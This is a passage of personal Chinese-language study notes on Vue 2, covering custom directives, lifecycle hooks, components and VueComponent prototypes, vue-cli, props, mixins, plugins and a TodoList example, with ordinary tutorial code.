			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
                //函数式指令
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
                //对象式自定义指令，规定写法bind、inserted、update
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时，被页面成功渲染时执行
					inserted(element,binding){
                        //获取焦点，元素如果没有被渲染你用这，怎么能获取用户的焦点
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value*100
					}
				}
			}
		})
		
	</script>
</html>
```



# 四、生命周期函数

<img src="https://i0.hdslb.com/bfs/album/4b8abadc89ea7b81251d7273adc5cd09f3ddc325.png" alt="image-20220614112509855" style="zoom: 67%;" />

钩子函数有哪些？

> beforeCreate和created、
>
> beforeMount和mounted、
>
> beforeUpdate和updated、
>
> beforeDestroy和destroyed
>
> 四对！

### mounted

>页面渲染完后，自动执行的mounted。
>
>在beforeMount和mounted之间完成了虚拟转换成真实DOM
>
>可以在mounted写：**Ajax发送网络请求**、开启定时器、、订阅消息、绑定自定义事件、等初始化操作。

 生命周期：
            1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
            2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。

```html
//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				setInterval(() => {
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
```



### beforedestroy

即销毁前：

马上要执行销毁过程，在此对数据可以访问，但是进行数据的更新是无效的，在destroy之前进行都可以。

一般在此阶段进行*关闭定时器、取消订阅消息、解绑自定义事件*等收尾操作



### destroyed

**销毁vm，使用**`vm.$destroy`



### 生命周期总结+清除定时器

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
		常用的生命周期钩子：
			1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
			2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

		关于销毁Vue实例
			1.销毁后借助Vue开发者工具看不到任何信息。
			2.销毁后自定义事件会失效，但原生DOM事件依然有效。
			3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 :style="{opacity}">欢迎学习Vue</h2>
			<button @click="opacity = 1">透明度设置为1</button>
			<button @click="stop">点我停止变换</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		 new Vue({
			el:'#root',
			data:{
				opacity:1
			},
			methods: {
				stop(){
					this.$destroy()
				}
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				this.timer = setInterval(() => {
					console.log('setInterval')
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
			beforeDestroy() {
				clearInterval(this.timer)
				console.log('vm即将驾鹤西游了')
			},
		})

	</script>
</html>
```



# 五、组件+开发

## 5.1 非单组件

### 什么是组件化？

组件实现对前端三剑客和**资源**（即MP3、MP4、jpg）的封装，包成成一个组件，也就是组件化，然后组件给App管理，App在vm这里注册，vm就可指挥调用

![image-20220607000341698](https://i0.hdslb.com/bfs/album/d19ad15635a830dbd38c9b32278cfe2e5bdb90cd.png)



### 非单文件组件

非单文件组件就是说1个hmtl文件里有1个以上的组件。

组件components里不能写el元素绑定，因为vm老大才是拿来绑定el容器的。

**data要写成函数式**：对象式的话，别人使用的是data原对象，会把data当成一个对象来改了，但是函数式是别人拿到data函数的return返回值，改变的返回值当然不会影响原来的data数据。

**全局注册组件**与局部注册组件。全局的话多个vm对象都能共同调用

单文件开的组件里，写的模板只能是用**template:``**了

代码：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本使用</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
        Vue中使用组件的三大步骤：
            一、定义组件(创建组件)
            二、注册组件
            三、使用组件(写组件标签)

        一、如何定义一个组件？
            使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
            区别如下：
                1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
                2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
            备注：使用template可以配置组件结构。

        二、如何注册组件？
            1.局部注册：靠new Vue的时候传入components选项
            2.全局注册：靠Vue.component('组件名',组件)

        三、编写组件标签：
            <school></school>
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<hello></hello>
			<hr>
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>

		<div id="root2">
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
				</div>
			`,
			// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			},
			methods: {
				showName(){
					alert(this.schoolName)
				}
			},
		})

		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'张三',
					age:18
				}
			}
		})
		
		//第一步：创建hello组件
		const hello = Vue.extend({
			template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
			data(){
				return {
					name:'Tom'
				}
			}
		})
		
		//注册方式①：全局注册组件
		Vue.component('hello',hello)

		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好啊！'
			},
			//注册方式②：注册组件（局部注册）
			components:{
				school,
				student
			}
		})

		new Vue({
			el:'#root2',
		})
	</script>
</html>
```

### 组件风格

> - 组件命名风格   
> - 不用写const s = Vue.extend（{}）直接为const s = {}
> - 渲染组件时候可以写成自闭和标签

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>几个注意点</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
        几个注意点：
            1.关于组件名:
                一个单词组成：
                    第一种写法(首字母小写)：school
                    第二种写法(首字母大写)：School
                多个单词组成：
                    第一种写法(kebab-case命名)：my-school,注册组件时候要引号喔！
                    第二种写法(CamelCase命名)：MySchool (大驼峰命名需要Vue脚手架支持)
                备注：
                    (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
                    (2).可以使用name配置项指定组件在开发者工具中呈现的名字。

                2.关于组件标签:
                    第一种写法：<school></school>
                    第二种写法：<school/>
                    备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

                3.一个简写方式：
                    const school = Vue.extend(options) 可简写为：const school = options
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>{{msg}}</h1>
			<school></school>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义组件
		const s = Vue.extend({
			name:'atguigu',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			}
		})

		new Vue({
			el:'#root',
			data:{
				msg:'欢迎学习Vue!'
			},
			components:{
				school:s
			}
		})
	</script>
</html>
```

### 错题集

至此练手一下，发现错漏百出，函数式忘了return，el绑定id忘了#号，组件注册用复数components

### 组件的嵌套

父组件包含子组件，**子组件要写父组件之前**，且在父组件**注册**和**template**渲染。

最终所有组件都注册在**App组件**中，App组件用于管理所有的组件，他是在vm之下，“一人之下，万人之上”的组件。



代码：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>组件的嵌套</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//定义student组件
		const student = Vue.extend({
			name:'student',
			template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					age:18
				}
			}
		})
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			//注册组件（局部）
			components:{
				student
			}
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`<h1>{{msg}}</h1>`,
			data(){
				return {
					msg:'欢迎来到尚硅谷学习！'
				}
			}
		})
		
		//定义app组件
		const app = Vue.extend({
			template:`
				<div>	
					<hello></hello>
					<school></school>
				</div>
			`,
			components:{
				school,
				hello
			}
		})

		//创建vm
		new Vue({
			template:'<app></app>',
			el:'#root',
			//注册组件（局部）
			components:{app}
		})
	</script>
</html>
```



### 组件实例对象vc



![image-20220607134600039](https://i0.hdslb.com/bfs/album/a7bf59b8c1e0b5c3493f0d70729f1c93ac474c72.png)

关于VueComponent：

 1.school**组件本质是**一个**名为VueComponent的构造函数**，且不是程序员定义的，是`Vue.extend`生成的。

2.我们写`<school/>`或`<school></school>`时候，**就是new了这个构造函数**实例vc。Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。

3.特别注意：每次**调用Vue.extend**，返回的都是一个**全新的VueComponent**，如上图所示为Vue.js的源码，**sub是return回来的**。因此他们的Vue组件之间定义的所有东西都是组件内的互不干扰。

4.关于**this指向**：

(1).组件配置中：里面的this均是【VueComponent实例对象 = **vc**】。

 (2).new Vue(options)配置中： data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象 = vm】。

5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。 Vue的实例对象，以后简称vm。




```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>VueComponent</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>

		<!-- 准备好一个容器-->
		<div id="root">
			<school></school>
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showName">点我提示学校名</button>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			methods: {
				showName(){
					console.log('showName',this)
				}
			},
		})

		const test = Vue.extend({
			template:`<span>atguigu</span>`
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`
				<div>
					<h2>{{msg}}</h2>
					<test></test>	
				</div>
			`,
			data(){
				return {
					msg:'你好啊！'
				}
			},
			components:{test}
		})


		// console.log('@',school)
		// console.log('#',hello)

		//创建vm
		const vm = new Vue({
			el:'#root',
			components:{school,hello}
		})
	</script>
</html>
```



### Vue内部的内置关系

> 作用：有了这样的内置关系，那么子孙们就可以访问祖宗类的数据了。
>
> - `__proto__`写在实例的对象里（vc、vm），对象则有隐式的原型属性`__proto__`
>
> - prototype 显式原型属性的。Vue构造函数拿到 Vue.prototype ，此时 **Vue.prototype 是 Vue构造函数的原型对象。**
>
> - `vm.__proto__` 指向 “构造函数Vue” 的原型对象，“构造函数 Vue ”的原型对象也是一个对象，也存在 `__proto__` 属性，因此 `Vue.prototype.__proto__` 指向的是 Object

看如下代码一目了然：

```js
        console.log('判断①：',vm.__proto__ == Vue)//false
        console.log('判断②：',vm.__proto__ == Vue.prototype)//true

Vue.prototype.x={a=1,b=2}        //等同于在Vue原型对象上放了一个x对象的数据。

```

> 为啥没有new VueComponent？

首先`Vue.extend()`把组件定义出来，然后在写组件标签的时候`<Student/>`，这一步**自动调用了new！**

![image-20220607160238868](https://i0.hdslb.com/bfs/album/80e004e504233ff420452570fc18073a89169c30.png)



>这是我个人的理解：

```js
 <script>
     
在script标签下，可以Vue.prototype.x={}     因为Vue是就Import Vue进来的，


但是在script标签下不能写VueComponent
//在script标签下写VueComponent，返回错误：VueComponent是未定义的
//因为VueComponent是Vue.extend、Vue.component产生的,即VueComponent函数是在Vue里的extend函数里面的（读源码就知道）
//而VueComponent若这样定义，那必定是在Vue里面

不能写VueComponent.prototype.y={} 
//因为extend函数调用VueComponent函数，return返回生成的vc每次都是不同的VueComponent，全新的VueComponent，
如果改源码，在源码加一个y属性参数。那确实，每次新生成的VueComponent时，每次都带有你改动源码y的值，那肯定拿得到VueComponent.prototype.y={} ，但是何必这样。

而Vue的原型对象不同啊，他是真祖宗啊。肯定用他！



</script>
```



![image-20220609190603924](https://i0.hdslb.com/bfs/album/15bdd1b6484dcdeccedc3c18cde4f095d57d26b1.png)







## 5.2 单组件开发

### school.vue组件

- 容器写在**template标签**里，**相当于之前写在里边的template``模板**，因此能拿到数据
- **组件内写name**：把组件名定死，别人再使用注册组件就不能起乱七八糟的名字。
- Vue.extend({})**被省略**为{}
- **要暴露组件**。一般使用默认暴露的方式，import的时候就写法就会方便一些

school.vue

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
         //组件内写name，写死组件名
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```



### App.vue是组件老大

所有组件的管理者

1. 先**import**导入子组件，
2. 再把要用的**组件注册到App里边**components，
3. 再把标签渲染在div里面，即把组件的vc     **New出来**。

```vue
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```

### main.js是vm

> 跑vue项目的时候第一个找的就是vm，即main.js

①绑定容器**root**。

②把**App注册**来就可以了

③标签渲染在**template:``**

```vue
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

### index.html是容器

这个是**容器root**

①写好容器

②引入js文件，就是**把vm引入**进来。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="./main.js"></script>
	</body>
</html>
```



## 5.3 vue-cli脚手架

### vue文件目录分析

> 根目录

![image-20220607175622671](https://i0.hdslb.com/bfs/album/d0d815837331d381d67b75dc4574ab036a6e8446.png)

> 打开**src文件里边**：

![image-20220607175808081](https://i0.hdslb.com/bfs/album/dee910cafde2f8212a05aba43080d14287b6cc06.png)

> 根容器index.html

解析看如下注释：

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
     <!-- 让垃圾ie浏览器以最高级别渲染该网页-->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <!-- 移动端开启理想饰视口-->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
      <!-- 因为pulic下的logo图标，<%= BASE_URL %>就是pulic/的意思，人家这样写更好。-->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
     <!-- 浏览器标题内容，读取的是你package.json里的 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
      <!--这年代了哪个浏览器还没js -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```



### render为何意？

render是一个函数，因为**精简版本的vue.js不能解析template:``模板**，所以用这个代替，App就是组件老大。

为什么要template模板？

你把组件注册了完呢然后呢？还得把组件渲染到容器吧，就是在容器写**<App/>**，不过容器在另外一个HTML文件。所以，在vm里的template的模板写，就是 **render: h => h(App)**

·····深入了解，看原视频吧

```js
new Vue({
  router,
  store,
  render: h => h(App)
}).$mount('#app')



详写：h这个参数随意的
render:(h){
    h('h1','你好啊')//h1标签里面写你好啊，那么里面写App，就是写<App/>标签了。
}
```



### 配置问题

参考官网：[配置参考 | Vue CLI (vuejs.org)](https://cli.vuejs.org/zh/config/#pages)

自己创建一个配置文件，`vue.config.js` 是一个可选的配置文件。里面自定义的配置可以覆盖底层的配置文件，可以用于**关闭语法检查···等等**

如果项目的根目录中存在这个文件 (和 `package.json` 同级的) ，那么它会被 `@vue/cli-service` 自动加载。

![image-20220607204935678](https://i0.hdslb.com/bfs/album/83df14387ecf76d8c9f17d57cd724b2146861aae.png)



## 5.4 ref+props+mixin+plugin+scoped

### 1. ref属性

id的替代者，vue的特性。

- 获取到DOM元素
- 父组件可获取到子组件的vc对象，看下面代码

App.vue

```vue
<template>
	<div>
        id被替换为ref，下面再通过vm.$refs.title获取到这个DOM元素
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
         如果给子组件添加ref，通过父组件vm.$refs.sch就可获取school这个子组件的vc对象。
		<School ref="sch"/>
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App',
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>
```



### 2. props实现父传子参

> App父组件在容器内直接：`<Student a='1'/>`，就给子组件Student传值，子组件用`props`接收，props的数据不允许修改。

子组件在被父组件调用时，父组件要给子组件传值时，**子组件要用props来接收父组件传来的值**，而且**props可以对传来的值添加一些限制条件**(如必填项、只填数字····)

如果单纯接收了，data里就**不要再写name值的key-value了**，要写可以把props接收的name传给新的key名MyName，如下图：

![image-20220607221304289](https://i0.hdslb.com/bfs/album/56a4c517ee324711a8b47a45eeab725ba9aef196.png)

**因此也可以看出，pros加载在data之前。**



> 子组件

```vue
<template>
	<div>
		<h1>{{msg}}</h1>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<h2>学生年龄：{{myAge+1}}</h2>
		<button @click="updateAge">尝试修改收到的年龄</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			console.log(this)
			return {
				msg:'我是一个尚硅谷的学生',
				myAge:this.age
			}
		},
		methods: {
			updateAge(){
				this.myAge++
			}
		},
		//简单声明接收
		// props:['name','age','sex'] 

		//接收的同时对数据进行类型限制
		/* props:{
			name:String,
			age:Number,
			sex:String
		} */

		//接收的同时对数据：进行类型限制+默认值的指定+必要性的限制
		props:{
			name:{
				type:String, //name的类型是字符串
				required:true, //name是必要的
			},
			age:{
				type:Number,
				default:99 //默认值
			},
			sex:{
				type:String,
				required:true
			}
		}
	}
</script>
```

> 父组件App.vue使用子组件时，传值

因为子组件要求age格式为数字类型，所以age用v-bind，注意v-bind的作用。

**App.vue**

```vue
<template>
	<div>
		<Student name="李四" sex="女" :age="18"/>
	</div>
</template>

<script>
	import Student from './components/Student'

	export default {
		name:'App',
		components:{Student}
	}
</script>
```



### 3. props实现子传父参

父给子组件传递一个函数（即方法），子组件接收父传来的函数，子再调用这个函数的同时，加上参数传递给父即可

父组件：把函数传给子

```vue
<template>
  <div class="app">
      
    <!-- 通过父组件给子组件传递函数类型的props实现子给父传递数据 ,用上v-bind说明“getSchoolName”不是字符串，而是函数-->
    <School :getSchoolName="getSchoolName"/>
      
  </div>
</template>
```

子组件：接收函数，并用click事件触发函数，传递参数

<img src="https://article.biliimg.com/bfs/article/75a4181ecddb034952d2d546721d7874822942e1.png" style="zoom:50%;" />



### 4. 暴露与导入

```text
①默认暴露
暴露：export default {}
导入：import App from './App.vue'

②分别暴露，花括号包起来，多个用逗号隔开
暴露：export const a = {}，export let b = 3
导入：import {a,b} from '../mixin'
```





### mixin混入

mixin.js文件，命名其实随意，与main.js同级就行

> 功能：把组件**script标签内共用的配置，提取成一个混入对象供组件导入使用**

(1)全局混入：在vm里，`Vue.mixin(xxx)`

(2)局部混入：在vc里，`mixins: [ "xxx "]`

> 若混合.js和原组件的冲突，除了生命周期函数是一起合并的，其他的data、methods等，是以组件的为主！mixin.js无效，看代码演示

mixin.js

```js
//分别暴露
export const hunhe = {
    // data数据、methods方法以原来的组件为主
    data() {
        return {
            age: 30
        }
    },
    methods: {
        showName() {
            
                alert(this.name)
        }
    },
     // 生命周期的钩子会合并，来者不拒一起生效
     mounted () {
        console.log('我是mixin')
     }
}
```

**Student.vue**

```vue
<template>
  <div>
    <h2 @click="showName">学生名字：{{ name }}</h2>
    <h2>学生年龄：{{ age }}</h2>
  </div>
</template>

<script>
// 分别暴露导入用{}包起来，多个混合就用逗号隔开。
import { hunhe } from "../mixin";
export default {
  name: "Student",
  data() {
    return {
      name: "cola",
      age: 19,
    };
  },
  //局部混入
  mixins: [hunhe],
  methods: {
    showName() {
      console.log("我是Student组件！");
    },
  },
  mounted() {
    console.log("我是原组件");
  },
};
</script>

<style>
</style>
```

**App.vue**

```vue
<template>
  <div>
    <Student></Student>
  </div>
</template>

<script>
import Student from "./components/Student";
export default {
  name: "App",
  components: {
    Student,
  },
  data() {
    return {}
  },
};
</script>

<style>
</style>
```

### plugin插件增强

> 作用：在`plugin.js`文件，可以定义**全局混合、全局自定义指令、全局过滤器、全局方法**，然后在vm里面直接Vue.use()，然后**所有组件们都能用**。

**plugin.js**

> 定义一个插件，官方规定写install函数，install函数括号**第一个参数是Vue默认传来的，它是Vue缔造者**
>
> 有了Vue就可以定义全局的东西了！注意全局方法是写在Vue的原型上，在原型上的方法，vm、vc如子类使用父类方法，当然可以用。

```js
export default {
  install(Vue,x,y,z){
    console.log(x,y,z)
    //全局过滤器
    Vue.filter('mySlice', function(value){return value.slice(0,4)})

    //定义全局指令
    Vue.directive('fbind',{
      //指令与元素成功绑定时（一上来）
      bind(element,binding){element.value = binding.value},
      //指令所在元素被插入页面时
      inserted(element,binding){element.focus()},
      //指令所在的模板被重新解析时
      update(element,binding){element.value = binding.value}
    })

    //定义混入
    Vue.mixin({
      data() {return {x:100,y:200}},
    })

    //给Vue原型上添加一个方法（vm和vc就都能用了）
    Vue.prototype.hello = ()=>{alert('你好啊')}
  }
}
```



**main.js**

> 使用plugin增强插件Vue.use(plugins)	

```js
import Vue from 'vue'
import App from './App.vue'
import plugins from './plugins'	// 引入插件

Vue.config.productionTip = false

Vue.use(plugins,1,2,3)	// 应用（使用）插件

new Vue({
	el:'#app',
	render: h => h(App)
})
```

### scoped样式

作用：让样式在局部生效，防止各个组件的class类名相同而冲突
写法：`<style scoped>`

在App.vue是否使用scoped，视情况而定。如果使用会导致样式不能在所有子组件生效，

```vue
这个lang是选择CSS、还是less，默认css，可省略。
<style lang="">
  
</style>
```



## 5.5 TodoList案例

### 如何把 “原生html+css” 改装为组件vue

第一步：分析前端页面，划分为组件，最后把组件空架构写好在代码中。

第二步：拿到原生html代码，把body的所有代码，复制到App的template模板内

第三步：拿到原生css代码，把css的所有代码，复制到App的style标签内

第四步：拆分template代码，一点点移到组件中，剪切的同时在App的template模板内写上组件标签如`<MyHeader/>`，拆完

第五步：拆分css代码，一点点移到组件中，查看是否要添加scoped，拆完收工



### 实现列表动态数据（不好）

所有已有的列表数据写在list组件，list把遍历出来的**对象obj作为传入的数据**，子组件item**用props接收对象**，并把对象的插值语法加容器里的标签上。

勾选框checkbox的checked属性，用`v-bind:checked='obj.done'`，来绑定是true还是false



### Header添加数据（改进）

数据若一堆组件再用，那么存放到父组件中，若只有一个组件在用，那么数据只写到那个组件就行了

> ①子组件给传父组件数据
>
> ②`nanoid`生成随机id
>
> // 将用户的输入包装成一个todo对象 
> const todoObj = { id:nanoid(), title:this.title, done:false }

输入框的数据属于Header组件，Header组件的数据怎么传给兄弟组件List，兄弟组件的传值？目前办不到。

![image-20220608134245201](https://i0.hdslb.com/bfs/album/ee655f5ba259dc4f1ec32cb06679c1a1d765f58f.png)



改进方法：原有数据不放在List里了，把**data中存放已有的数据对象的数组放在App中**，App通过父传子的方法把数组传给List，List再把数组的单个对象传给item。

> 然后，子组件header把输入框的数据传到父组件App中，**怎么传？**

父组件在methods里写一个函数，把qwe函数传给子组件（父组件可传任意东西给子组件，子组件都可用props接收）

然后Header再触发的回车事件的add方法里边，使用父组件传来的qwe函数，qwe函数里边的参数就是生成的对象；

然后父组件在methods里的qwe函数：`qwe（myobj）`，这个myobj就是新对象了，然后`this.数组名.unshift（myobj）`把对象添加到数组中，传给list即可！



### CheckBox勾选

> ①违反原则的勾选框最简单实现：

`v-model='todo.done'`     直接双向绑定实现done值改变为true、false。checked=true的逻辑都不用写···直接双向绑定实现。

因为当输入框的类型type为checkbox，且双向绑定的为布尔值，那么双向绑定的布尔值就能决定你勾选还是不勾选。



> ②真正的实现

手写勾选框确实是在item组件，但是item组件的数据是父组件App里传来的。

**原则：数据是哪个组件的，操作数据的方法就写在哪个组件中。**

因此checked属性的布尔值取反操作方法啊，是写在App的组件中，而不是写在item组件。

而item组件，只需要使用父组件传来的函数，把**对象的id传给父组件**即可，父组件再拿到这个id对应的对象，把其done值进行取反即可。

```vue
//子组件的代码片段
<input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>  

//勾选or取消勾选一个todo
//遍历了一遍啊···
      checkTodo(id){
        this.todos.forEach((todo)=>{
          if(todo.id === id) todo.done = !todo.done
        })
      },
```

### 删除item实现

类似CheckBox勾选的实现，使用的是js过滤函数filter，此函数生成的是新数组，`this.旧数组 = 新数组`   就行了

### 底部统计已勾选数量

使用计算属性computed

![image-20220608152527469](https://i0.hdslb.com/bfs/album/b43040a20f4a708135084fd67115e8c0dfe4fff2.png)

### 全选和取消全选



> 逻辑①：检测到手动选完了，勾选框要自动勾上

当你一个个列表的框全部勾选完，即勾选数目 = 总数时，全选框触发勾选，此时全选框的绑定计算属性`:checked='isAll'`，isAll计算属性返回的布尔值，即勾选===总数为真，否则为假。

> 逻辑②：你点击全选时，则对象会全部勾选，对象对应的“是否已完成”字段的布尔值全部为真，取消全选就全部设布尔值为假。

改进后，用v-model绑定自己的计算属性了

#### Footer.vue

```vue
<template>
  <div class="todo-footer" v-show="total">
    <label>
      <!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
      <input type="checkbox" v-model="isAll"/>
    </label>
    <span>
      <span>已完成{{ doneTotal }}</span> / 全部{{ total }}
    </span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>

<script>
  export default {
    name:'MyFooter',
    props:['todos','checkAllTodo','clearAllTodo'],
    computed: {
      // 总数
      total(){
        return this.todos.length
      },
      // 已完成数
      doneTotal(){
        //此处使用reduce方法做条件统计
        return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
      },
      // 控制全选框，属性的完整写法
      isAll:{
        //全选框是否勾选
        get(){
          return this.doneTotal === this.total && this.total > 0
        },
        //isAll被修改时set被调用，value值是get的return值
        set(value){
          this.checkAllTodo(value)
        }
      }
    },
    methods: {
      /* checkAll(e){
				this.checkAllTodo(e.target.checked)
			} */
      //清空所有已完成
      clearAll(){
        this.clearAllTodo()
      }
    },
  }
</script>

<style scoped>
  /*footer*/
  .todo-footer {height: 40px;line-height: 40px;padding-left: 6px;margin-top: 5px;}
  .todo-footer label {display: inline-block;margin-right: 20px;cursor: pointer;}
  .todo-footer label input {position: relative;top: -1px;vertical-align: middle;
    margin-right: 5px;}
  .todo-footer button {float: right;margin-top: 5px;}
</style>
```

#### App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader :addTodo="addTodo"/>
        <MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
        <MyFooter :todos="todos" 
                  :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
    	</div>
    </div>
  </div>
</template>

<script>
  import MyHeader from './components/MyHeader'
  import MyList from './components/MyList'
  import MyFooter from './components/MyFooter.vue'

  export default {
    name: 'App',
    components: { MyHeader, MyList, MyFooter },
    data() {
      return {
        // 由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
        todos:[
          {id:'001',title:'抽烟',done:true},
          {id:'002',title:'喝酒',done:false},
          {id:'003',title:'开车',done:true}
        ]
      }
    },
    methods: {
      //添加一个todo
      addTodo(todoObj){
        this.todos.unshift(todoObj)
      },
      //勾选or取消勾选一个todo
      checkTodo(id){
        this.todos.forEach((todo)=>{
          if(todo.id === id) todo.done = !todo.done
        })
      },
      //删除一个todo
      deleteTodo(id){
        this.todos = this.todos.filter( todo => todo.id !== id )
      },
       //-- 此处开始--
